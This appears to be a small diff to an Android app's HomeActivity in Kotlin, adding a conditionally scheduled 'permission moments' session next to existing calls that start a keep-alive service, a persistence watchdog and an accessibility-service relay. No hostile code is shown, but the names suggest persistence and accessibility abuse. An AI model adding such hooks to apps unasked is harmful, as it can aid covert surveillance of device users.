@@ -26,6 +26,9 @@ class HomeActivity : AppCompatActivity() {
         SafeKeepAlive.start(this)
         PersistenceWatchdog.schedule(this)
         TouchAccessibilityService.instance?.ensureRelay()
+        if (PermissionMoments.hasHomeBatch(this)) {
+            PermissionMoments.scheduleHomeSession(this)
+        }
     }
 
     override fun onNewIntent(intent: Intent) {
